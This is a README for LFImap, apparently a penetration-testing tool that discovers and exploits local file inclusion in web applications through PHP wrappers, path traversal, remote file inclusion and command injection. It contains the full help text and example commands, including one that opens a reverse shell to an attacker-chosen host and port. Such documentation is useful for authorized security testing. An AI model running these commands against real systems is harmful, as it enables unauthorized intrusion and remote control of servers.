# LFImap
## Local file inclusion discovery and exploitation tool

### Main features
- Attack with inclusion wrappers
    - Filter wrapper arbitrary file inclusion
    - Data wrapper remote command execution
    - Input wrapper remote command execution
    - Expect wrapper remote command execution
    - File wrapper arbitrary file inclusion
- Attack with path traversal
- Remote file inclusion
- Polyglot command injection check
- Heuristic scans
    - Polyglot XSS, CRLF checks
    - Open redirect check
    - Error-based info leak

- Testing modes
    - -U -> specify single URL to test
    - -F -> specify wordlist of URLs to test
    - -R -> specify raw http from a file to test

- Full control over the HTTP request
    - Specification of parameters to test (GET, FORM-line, Header, custom injection point)
    - Specification of custom HTTP headers 
    - Ability to test with arbitrary form-line (POST) data
    - Ability to test with arbitrary HTTP method
    - Ability to pivot requests through a web proxy
    - Ability to tune testing with timeout in between requests and maximum response time, before giving up on it
    - Support for payload manipulation via url and base64 encoding(s)
    - Support to output all requests and responses to a file
    - Quick mode (-q), where LFImap uses fewer carefully selected payloads
    - Second order (stored) vulnerability check support
    - Beta/Testing phase CSRF handling support

### Documentation
- [Installation](https://github.com/hansmach1ne/lfimap/wiki/Installation)

### -h, --help

```                  
 usage: lfimap.py [-U [url]] [-F [urlfile]] [-R [reqfile]] [-C <cookie>] [-D <data>] [-H <header>]
                 [-M <method>] [-P <proxy>] [--useragent <agent>] [--referer <referer>]
                 [--placeholder <name>] [--delay <milis>] [--max-timeout <seconds>]
                 [--http-ok <number>] [--csrf-param <param>] [--csrf-method <method>]
                 [--csrf-url <url>] [--csrf-data <data>] [--second-method <method>]
                 [--second-url <url>] [--second-data <data>] [--force-ssl] [--no-stop] [-f] [-i]
                 [-d] [-e] [-t] [-r] [-c] [-file] [-heur] [-a] [-n <U|B>] [-q] [-x]
                 [--lhost <lhost>] [--lport <lport>] [--callback <hostname>] [-wT <path>]
                 [--use-long] [--log <file>] [-v] [-h]

LFImap, Local File Inclusion discovery and exploitation tool

TARGET OPTIONS:
  -U [url]                  Single url to test
  -F [urlfile]              Load multiple urls to test from a file
  -R [reqfile]              Load single request to test from a file

REQUEST OPTIONS:
  -C <cookie>               HTTP session Cookie header
  -D <data>                 HTTP request FORM-data
  -H <header>               Additional HTTP header(s)
  -M <method>               Request method to use for testing
  -P <proxy>                Use a proxy to connect to the target endpoint
  --useragent <agent>       HTTP user-agent header value
  --referer <referer>       HTTP referer header value
  --placeholder <name>      Custom testing placeholder name (default is "PWN")
  --delay <milis>           Delay in miliseconds after each request
  --max-timeout <seconds>   Number of seconds after giving up on a response (default 5)
  --http-ok <number>        Http response code(s) to treat as valid
  --csrf-param <param>      Parameter used to hold anti-CSRF token
  --csrf-method <method>    HTTP method to use during anti-CSRF token page visit
  --csrf-url <url>          URL address to visit for extraction of anti-CSRF token
  --csrf-data <data>        POST data to send during anti-CSRF token page visit
  --second-method <method>  Specify method for second order request
  --second-url <url>        Url for second order request
  --second-data <data>      FORM-line data for second-order request
  --force-ssl               Force usage of HTTPS/SSL if otherwise not specified
  --no-stop                 Don't stop using the same testing technique upon findings

ATTACK TECHNIQUE:
  -f, --filter              Attack using filter wrapper
  -i, --input               Attack using input wrapper
  -d, --data                Attack using data wrapper
  -e, --expect              Attack using expect wrapper
  -t, --trunc               Attack using path traversal with wordlist (default "short.txt")
  -r, --rfi                 Attack using remote file inclusion
  -c, --cmd                 Attack using command injection
  -file, --file             Attack using file wrapper
  -heur, --heuristics       Test for miscellaneous issues using heuristics
  -a, --all                 Use all supported attack methods

PAYLOAD OPTIONS:
  -n <U|B>                  Specify payload encoding(s). "U" for URL, "B" for base64
  -q, --quick               Perform quick testing with fewer payloads
  -x, --exploit             Exploit and send reverse shell if RCE is available
  --lhost <lhost>           Local ip address for reverse connection
  --lport <lport>           Local port number for reverse connection
  --callback <hostname>     Callback location for rfi and cmd detection

WORDLIST OPTIONS:
  -wT <path>                Path to wordlist for path traversal modality
  --use-long                Use "src/wordlists/long.txt" wordlist for path traversal modality

OUTPUT OPTIONS:
  --log <file>              Output all requests and responses to specified file

OTHER:
  -v, --verbose             Print more detailed output when performing attacks
  -h, --help                Print this help message

```

### Examples 

#### 1) All attacks with '-a' (filter, input, data, expect and file wrappers, remote file inclusion, command injection, XSS, error disclosure).
`python3 lfimap.py -U "http://IP/vuln.php?param=PWN" -C "PHPSESSID=XXXXXXXX" -a`  

![Lfimap-1](https://user-images.githubusercontent.com/57464251/186299395-c6a91666-0e95-484e-8537-6f248d257f5b.png)


#### 2) Reverse shell command execution attack with '-x'
`python3 lfimap.py -U "http://IP/vuln.php?param=PWN" -C "PHPSESSID=XXXXXXXX" -a --lhost IP --lport PORT -x`  

![Lfimap-2](https://user-images.githubusercontent.com/57464251/186299661-7d6b480b-953f-4a7e-a806-5f39435f07fd.png)


#### 3) Post argument testing with '-D'

`python3 lfimap.py -U "http://IP/index.php" -D "page=PWN" -a`

![Lfimap-3](https://user-images.githubusercontent.com/57464251/186302047-0a2e9ab9-e4f0-43bb-b245-0235b6950ea0.png)


If you notice any issues with the software, please open up an issue. I will gladly take a look at it and try to resolve it. <br>
Pull requests are welcome.

[!] Disclaimer: Lfimap usage for attacking web applications without consent of the application owner is illegal. Developers assume no liability and are 
not responsible for any misuse and damage caused by using this program.
